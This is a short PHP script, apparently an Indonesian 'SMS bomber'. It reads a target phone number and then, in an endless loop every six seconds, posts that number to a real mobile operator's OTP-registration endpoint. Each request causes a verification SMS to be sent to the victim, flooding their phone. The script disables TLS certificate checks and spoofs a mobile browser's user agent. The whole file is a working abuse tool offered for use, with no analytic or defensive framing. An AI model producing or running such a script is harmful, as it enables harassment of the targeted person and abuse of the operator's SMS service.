<?php
function sms($target) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateOTP");
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$target");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 9; in-id; SM-A107F Build/PPR1.180610.011) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16");
  $result = curl_exec($ch);
  curl_close($ch);
  $json = json_decode($result, true);
  sleep(0.1);  
  echo "\n  \033[1;37m[\033[1;31m✓\033[1;37m]\033[1;32m Berhasil\033[1;3m...";
}
echo $banner;
echo "\n  \033[1;37m[\033[1;31m!\033[1;37m]\033[1;34m Pake\033[1;31m 089xxxxxx";
echo "\n  \033[1;37m[\033[1;31m+\033[1;37m]\033[1;32m Nomor target \033[1;31m  : \033[1;34m";
$nomor = trim(fgets(STDIN));
echo "  \033[1;37m═════════════════════════════════════";
while (true) {
sleep(6);
  $execute = sms($nomor);
  print $execute;
}
system("exit");
?>

